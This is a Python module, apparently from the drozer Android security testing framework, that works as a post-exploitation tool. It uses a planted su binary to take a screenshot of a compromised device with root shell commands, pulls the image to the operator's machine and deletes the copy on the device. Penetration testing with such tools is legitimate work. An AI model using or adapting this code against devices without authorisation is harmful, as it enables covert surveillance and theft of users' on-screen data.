import os
import subprocess
import time

from drozer.modules import common, Module

class Screenshot(Module, common.SuperUser, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Take a screenshot of the device"
    description = "Take a screenshot of the device. Relies on minimal-su being correcly installed on the device (see tools.setup.minimalsu)"
    examples = """dz> run post.capture.screenshot
Done. Saved at /home/user/1416002550.png
"""
    author = "Tyrone (@mwrlabs)"
    date = "2013-04-18"
    license = "BSD (3 clause)"
    path = ["post", "capture"]

    def execute(self, arguments):
        
        # Check for existence of minimal-su
        if not self.isMinimalSuInstalled():
            self.stdout.write("[x] No su binary available (see tools.setup.minimalsu). Exiting...\n")
            return
            
        # Make timestamped file name
        filename = str(int(time.time())) + ".png"
        
        # Check for screencap binary
        if not self.exists("/system/bin/screencap"):
            self.stdout.write("[x] No known methods for taking screenshots on this device. Exiting...\n")
            return
        
        # Take screenshot
        self.shellExec("su -c \"screencap -p %s/screenshot.png\"" % self.workingDir())
        self.shellExec("su -c \"chmod 666 %s/screenshot.png\"" % self.workingDir())
        
        # Download
        length = self.downloadFile("%s/screenshot.png" % self.workingDir(), filename)
        
        # Remove screenshot from device
        self.shellExec("su -c \"rm %s/screenshot.png\"" % self.workingDir())

        # Full path to file
        fullPath = os.path.join(os.getcwd(), filename)
        
        if length != None:
            self.stdout.write("Done. Saved at %s \n" % fullPath)
            
            # Open in default application
            if os.name == 'posix':
                subprocess.call(('xdg-open', filename))
            elif os.name == 'nt':
                os.startfile(filename)
            elif os.name == 'darwin':
                os.system("open " + filename);
        else:
            self.stderr.write("Screenshot download failed.\n")
